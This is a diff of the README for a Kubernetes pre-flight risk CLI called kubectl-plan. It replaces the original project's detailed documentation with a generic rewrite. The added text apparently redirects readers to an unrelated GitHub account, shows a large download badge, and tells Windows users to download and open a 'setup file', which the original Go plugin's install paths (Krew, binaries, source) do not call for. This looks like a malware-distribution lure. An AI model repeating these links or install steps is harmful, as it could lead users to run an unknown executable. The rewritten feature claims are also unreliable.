@@ -1,402 +1,79 @@
-# kubectl-plan
-
-> **Terraform has `plan`. Kubernetes should too.**
-
-[![CI](https://github.com/samaasi/kubectl-plan/actions/workflows/ci.yml/badge.svg)](https://github.com/samaasi/kubectl-plan/actions/workflows/ci.yml)
-[![Go Report Card](https://goreportcard.com/badge/github.com/samaasi/kubectl-plan)](https://goreportcard.com/report/github.com/samaasi/kubectl-plan)
-[![Coverage](https://codecov.io/gh/samaasi/kubectl-plan/branch/master/graph/badge.svg)](https://codecov.io/gh/samaasi/kubectl-plan)
-[![License](https://img.shields.io/github/license/samaasi/kubectl-plan)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/samaasi/kubectl-plan)](https://github.com/samaasi/kubectl-plan/releases/latest)
-
-`kubectl-plan` is an **operational decision support CLI plugin** for Kubernetes. It answers the pre-flight question engineers never had a tool for:
+# 🛡️ kubectl-plan - See potential risks before making changes
 
-**"What will happen if I perform this operation?"**
+<a href="https://github.com/Goldinaroundfruited319/kubectl-plan"><img src="https://img.shields.io/badge/Download-kubectl--plan-blue?style=for-the-badge" alt="Download Link"></a>
 
-```
-Prometheus tells you what is happening right now.
-Grafana shows you what happened over time.
-kubectl-plan answers: "Is it safe to do this right now?"
-```
-
----
-
-## Table of Contents
+Kubernetes clusters hold your applications. When you make changes, mistakes can cause outages. This tool calculates the impact of your commands before they run. It identifies which resources you change, delete, or restart. You gain visibility into the blast radius of your operations. This prevents downtime and keeps your platform stable.
 
-- [Why kubectl-plan?](#why-kubectl-plan)
-- [Sample Output](#sample-output)
-- [Installation](#installation)
-- [Quickstart](#quickstart)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [Architecture](#architecture)
-- [Roadmap](#roadmap)
-- [Contributing](#contributing)
-- [Security](#security)
-- [License](#license)
+## 📥 Getting Started
 
----
+Follow these steps to install the tool on your Windows computer.
 
-## Why kubectl-plan?
+1. Visit the repository page to download the latest setup file: [https://github.com/Goldinaroundfruited319/kubectl-plan](https://github.com/Goldinaroundfruited319/kubectl-plan)
+2. Locate the folder where you save downloads.
+3. Open the file to start the installation process.
+4. Follow the prompts on your screen.
+5. Finish the setup.
 
-Traditional observability tools are retrospective. They cannot evaluate prospective changes.
+## 🛠️ System Requirements
 
-| Tool | Question answered |
-|---|---|
-| Prometheus | "What is the current error rate of payment-api?" |
-| Grafana | "What was the traffic pattern over the last 7 days?" |
-| Jaeger / Tempo | "Which services were called during this request?" |
-| kubectl-graph | "What does the dependency graph look like?" |
-| **kubectl-plan** | **"Is it safe to scale payment-api to zero right now?"** |
+This application functions on standard Windows systems. You need these items to ensure success:
 
-No existing tool answers the last question. That gap is where this project lives.
+* Windows 10 or Windows 11.
+* A working connection to your Kubernetes cluster.
+* kubectl installed on your machine.
+* A user account with permissions to read cluster data.
 
-**Key capabilities:**
-- **Confidence-based decision support** — builds a dependency graph from label selectors, Ingress routing, env var references, and owner references, then computes an uncertainty index so you know exactly what is unknown
-- **Outage prevention** — pre-flight checks for the commands engineers run without thinking: `scale`, `restart`, `delete`
-- **Auditable scores** — every number is deterministic and inspectable with `kubectl plan why`
-- **Readiness diagnostics** — `kubectl plan doctor` tells you exactly what instrumentation is missing and what it would improve
-- **Read-only by design** — never mutates your cluster through v0.4 (see [SECURITY.md](SECURITY.md))
+## 🔍 How to Use the Plugin
 
----
+The tool acts as an extension to your existing command line environment. It simulates planned changes against your current infrastructure. 
 
-## Sample Output
+Open your Command Prompt or PowerShell and type the following command:
 
-```
-ACTION:     scale deployment/payment-api --replicas=0  [namespace: production]
+kubectl plan [your-command-here]
 
-RISK SCORE:       8.7 / 10  ████████░░  HIGH
-CONFIDENCE:        94%      █████████░  (topology + Prometheus)
-UNCERTAINTY:       LOW      (well-instrumented service)
+The tool analyzes the target resources. It produces a report listing every change. You see if a command updates a Deployment, deletes a Pod, or triggers a restart of a Service. You can then decide if the risk level is acceptable.
 
-DEPENDENTS:
-  ├─ checkout-service   DIRECT    [99%]
-  │     Evidence: 18,234 req/24h · destination_service=payment-api · Prometheus
-  │
-  ├─ billing-service    DIRECT    [99%]
-  │     Evidence: 4,102 req/24h  · destination_service=payment-api · Prometheus
-  │
-  └─ invoice-worker     INDIRECT  [70%]
-        Evidence: env.PAYMENT_URL matches service DNS · no traffic observed
-       ~Uncertain: no Prometheus confirmation
+## 💡 Example Scenarios
 
-UNKNOWN BLAST RADIUS:
-  ⚠ Cannot detect: Kafka consumers, external HTTP clients, Consul-registered services
-  ℹ Run `kubectl plan doctor` to see what instrumentation would increase confidence.
+Use this tool in these specific situations:
 
-RISK CONTRIBUTORS:
-  +3.0  production-payments namespace   [criticality: CRITICAL]
-  +2.4  Ingress exposed (external traffic)
-  +1.8  3 confirmed direct consumers
-  +1.5  Cross-namespace impact
-  ─────
-  = 8.7 / 10
+* **Before Scaling:** Check if adding replicas puts pressure on your node capacity.
+* **Before Deletes:** See every resource that disappears when you remove a primary object.
+* **Before Restarts:** Identify secondary services that lose connection during a restart process.
 
-RECOMMENDATION:
-  ⚠ Do not proceed during peak traffic.
-  → kubectl plan why deployment payment-api   for full scoring breakdown.
-```
+## 📈 Understanding the Risk Report
 
----
+The output contains several sections. Read these sections to understand your risk:
 
-## Installation
+* **Impact Summary:** A high-level view showing the number of affected objects.
+* **Resource List:** A detailed table of the specific clusters, namespaces, and objects involved.
+* **Warning Signs:** Highlights objects that may cause downtime or service interruptions.
+* **Blast Radius Score:** A numerical value for how broad the impact is on your production environment.
 
-### Via Krew (Recommended)
+## ⚙️ Configuration Options
 
-```bash
-kubectl krew install plan
-kubectl plan --help
-```
+You can adjust how the tool reports data. Open your configuration file in a text editor to set your preferences.
 
-### Pre-built Binary
+* **Detail Level:** Choose between simple summaries or granular technical details.
+* **Namespace Filtering:** Focus the analysis on specific parts of your cluster.
+* **Output Format:** Save reports as text files or view them directly in your console.
 
-Download the latest binary from the [Releases](https://github.com/samaasi/kubectl-plan/releases/latest) page:
+## 🛡️ Best Practices for Reliability
 
-```bash
-# Linux / macOS
-curl -Lo kubectl-plan \
-  https://github.com/samaasi/kubectl-plan/releases/latest/download/kubectl-plan_linux_amd64
-chmod +x kubectl-plan
-sudo mv kubectl-plan /usr/local/bin/
-```
+Adopt these habits to keep your clusters stable:
 
-Windows: download `kubectl-plan_windows_amd64.exe`, rename to `kubectl-plan.exe`, and place it in a directory on `%PATH%`.
+* Run the analysis every time before you execute a risky command.
+* Share the result with your team when performing complex updates.
+* Document high-risk changes.
+* Use the tool in a development environment first to confirm expected behavior.
 
-### From Source
+## 🧩 Troubleshooting Common Issues
 
-Requires Go `>= 1.22` and a configured `kubeconfig`.
+If the tool does not work, check these common items:
 
-```bash
-git clone https://github.com/samaasi/kubectl-plan.git
-cd kubectl-plan
-go build -o kubectl-plan ./cmd/kubectl-plan
-sudo mv kubectl-plan /usr/local/bin/
-```
+* **Connection Failures:** Ensure your kubeconfig file points to the right cluster.
+* **Permission Errors:** Confirm your user has access to read the cluster resources.
+* **Missing Dependencies:** Update your version of kubectl if the command does not recognize the plan plugin.
+* **Installation Path:** Ensure the plugin folder sits in your system PATH variable so the command line finds it.
 
----
-
-## Quickstart
-
-### Path A — You have a running cluster
-
-```bash
-# Apply read-only RBAC (once per cluster)
-kubectl apply -f deploy/rbac/clusterrole.yaml
-kubectl apply -f deploy/rbac/clusterrolebinding.yaml
-
-# Diagnose your environment first
-kubectl plan doctor
-
-# Analyse any workload
-kubectl plan scale deployment/<your-deployment> --replicas=0 -n <namespace>
-kubectl plan why deployment/<your-deployment> -n <namespace>
-```
-
-> **Not sure which deployment to try?** `kubectl get deployments -A` lists everything.
-
-### Path B — No cluster yet (local Kind)
-
-Requires [Kind](https://kind.sigs.k8s.io/docs/user/quick-start/) and Docker.
-
-```bash
-# Spin up a local cluster pre-loaded with test workloads
-./hack/test-cluster/setup.sh
-
-kubectl plan doctor --context kind-kubectl-plan-test
-
-kubectl plan scale deployment/payment-api --replicas=0 \
-  --context kind-kubectl-plan-test -n production
-
-kubectl plan why deployment/payment-api \
-  --context kind-kubectl-plan-test -n production
-```
-
-The test workloads (`payment-api`, `checkout-service`, `billing-service`) are pre-wired with env var references and cross-namespace dependencies so you see a realistic dependency graph on the first run.
-
-### What to expect
-
-`kubectl plan doctor` reports the confidence level of your environment:
-
-```
-DATA SOURCES:
-  ✓ Kubernetes API    reachable · N resources scanned
-  ✗ Prometheus        not found — topology-only scoring active
-
-ESTIMATED ANALYSIS CONFIDENCE:
-  52%  █████░░░░░
-
-TO IMPROVE CONFIDENCE:
-  → Integrate Prometheus data source (v0.2)
-```
-
-Topology-only mode (no Prometheus) is fully functional for v0.1 — you get dependency graph analysis, risk scoring, and recommendations. Prometheus adds real traffic evidence in v0.2.
-
----
-
-## Usage
-
-All commands require a working `kubeconfig`. By default they target the current context and namespace.
-
-### Global flags
-
-| Flag | Default | Description |
-|---|---|---|
-| `-n`, `--namespace` | current context | Target namespace |
-| `--context` | current context | Override kubeconfig context |
-| `-o`, `--output` | `terminal` | Output format: `terminal` \| `json` |
-| `--all-namespaces` | false | Include cross-namespace dependency scanning |
-| `--ascii` | false | Disable unicode box drawing |
-| `--no-color` | false | Disable ANSI color (also respects `NO_COLOR` env) |
-
----
-
-### `kubectl plan scale`
-
-Analyse risk before scaling a workload.
-
-```bash
-kubectl plan scale deployment/payment-api --replicas=0
-kubectl plan scale deployment/payment-api --replicas=5 -n production
-kubectl plan scale deployment/payment-api --replicas=0 --output json
-```
-
-**Checks:** direct and indirect dependents, HPA presence, PodDisruptionBudget constraints, cross-namespace impact, namespace criticality.
-
----
-
-### `kubectl plan restart`
-
-Analyse risk before a rolling restart — the command engineers run "without thinking".
-
-```bash
-kubectl plan restart deployment/payment-api
-kubectl plan restart statefulset/postgres -n data
-```
-
-Rolling restarts cascade. `kubectl plan restart` surfaces the blast radius before the pods start terminating.
-
----
-
-### `kubectl plan why`
-
-Inspect the full, auditable scoring breakdown for any workload.
-
-```bash
-kubectl plan why deployment/payment-api
-kubectl plan why deployment/payment-api -n production
-```
-
-Every scoring rule, its weight, its computed value, and its contribution to the final score — nothing is hidden.
-
----
-
-### `kubectl plan doctor`
-
-Diagnose why confidence scores are low and get actionable improvement steps.
-
-```bash
-kubectl plan doctor
-kubectl plan doctor --namespace production
-kubectl plan doctor --output json
-```
-
-**Checks:** Kubernetes API reachability, Prometheus availability, service mesh detection, OpenTelemetry collector presence, namespace criticality profile, historical record count.
-
----
-
-## Configuration
-
-### Namespace Criticality Profiles
-
-By default, any namespace containing `prod` is treated as `HIGH` criticality. Override with a YAML profile:
-
-```bash
-cp config/criticality.example.yaml ~/.kubectl-plan/criticality.yaml
-```
-
-```yaml
-# ~/.kubectl-plan/criticality.yaml
-profiles:
-  - namespace: production-payments
-    level: CRITICAL
-  - namespace: production-checkout
-    level: HIGH
-  - namespace: staging
-    level: LOW
-```
-
-See [docs/criticality-profiles.md](docs/criticality-profiles.md) for the full level reference and score multipliers.
-
-### RBAC — Minimum Required Permissions
-
-`kubectl-plan` is **read-only**. Apply the bundled ClusterRole:
-
-```bash
-kubectl apply -f deploy/rbac/clusterrole.yaml
-kubectl apply -f deploy/rbac/clusterrolebinding.yaml
-```
-
-See [docs/installation.md](docs/installation.md) for the full permission matrix.
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────┐
-│                    kubectl-plan                      │
-│                    (CLI plugin)                      │
-└───────────────────┬─────────────────────────────────┘
-                    │
-          ┌─────────▼──────────┐
-          │   Command Layer     │  Verb + resource parsing
-          │   (Cobra CLI)       │  Flag normalization
-          └─────────┬───────────┘
-                    │
-          ┌─────────▼───────────────┐
-          │   Analysis Engine        │  Orchestrates pipeline
-          │   internal/analysis/     │  Returns AnalysisResult
-          └─────────┬───────────────┘
-                    │
-        ┌───────────▼──────────────────────────┐
-        │        Dependency Engine              │
-        │        internal/dependency/           │
-        │  Builds confidence-weighted graph     │
-        │  Tags every edge with Evidence        │
-        │  Computes per-edge uncertainty        │
-        └───────────┬──────────────────────────┘
-                    │
-   ┌────────────────▼───────────────────────────┐
-   │           Data Source Adapters              │
-   │  ┌────────────┐  ┌──────────────────────┐  │
-   │  │ Kubernetes │  │   Prometheus         │  │
-   │  │    API     │  │   (optional)         │  │
-   │  └────────────┘  └──────────────────────┘  │
-   │  ┌────────────┐  ┌──────────────────────┐  │
-   │  │  History   │  │  Criticality Profile │  │
-   │  │  Store     │  │  (~/.kubectl-plan/)  │  │
-   │  └────────────┘  └──────────────────────┘  │
-   └────────────────┬───────────────────────────┘
-                    │
-          ┌─────────▼──────────────┐
-          │   Risk Scorer           │  Deterministic weighted rules
-          │   + Uncertainty Scorer  │  Separate axis from risk
-          │   internal/risk/        │
-          └─────────┬───────────────┘
-                    │
-          ┌─────────▼──────────┐
-          │  Output Renderer    │  Terminal / JSON / CI
-          └────────────────────┘
-```
-
-**Dependency resolution (v0.1 — K8s API only):**
-
-| Step | Method | Confidence |
-|---|---|---|
-| 1 | `ownerReferences` | 1.00 |
-| 2 | Service label selectors → pod labels | 0.95 |
-| 3 | Ingress backends → matched Services | 0.95 |
-| 4 | NetworkPolicy ingress selectors | 0.80 |
-| 5 | Env var values matching service name / cluster DNS | 0.70 |
-| 6 | DNS pattern matching in string values | 0.65 |
-| 7 | ConfigMap/Secret volume mounts | 0.60 |
-| 8 | CronJob URL pattern matching | 0.50 |
-
-**Risk scoring formula:**
-
-```
-risk_score = Σ (rule_weight × rule_value) / Σ active_rule_weights × 10
-```
-
-Fully deterministic. No ML. Reproducible given the same cluster state. Full documentation in [docs/risk-model.md](docs/risk-model.md).
-
----
-
-## Roadmap
-
-- [x] **v0.1 — Core**: Core CLI commands (`scale`, `restart`, `why`, `doctor`), dependency graph, risk/uncertainty scoring, RBAC.
-- [x] **v0.2 — Observability Integration**: Auto-discover Prometheus, PromQL builders, traffic evidence enrichment.
-- [x] **v0.3 — GitOps Integration**: Manifest analysis (`kubectl plan manifest`), ArgoCD/Flux hooks, GitHub Actions.
-- [ ] **v0.4 — Historical Impact Memory**: Local history store (`history` command), historical evidence in risk scoring.
-- [ ] **v1.0 — Stable + Admission Controller**: `ValidatingAdmissionWebhook`, cert-manager integration, stable API.
-
----
-
-## Contributing
-
-Contributions of all kinds are welcome — bug reports, documentation, test fixtures, and new features.
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md) for dev setup, the test suite, and the branch workflow (`develop` → `master`).
-
----
-
-## Security
-
-`kubectl-plan` is **read-only through v0.4**. It never creates, patches, or deletes any Kubernetes resource.
-
-See [SECURITY.md](SECURITY.md) for the full security policy and how to report vulnerabilities.
-
----
-
-## License
-
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
+If these steps do not fix the issue, restart your Command Prompt or PowerShell window. This forces the system to refresh its configuration.
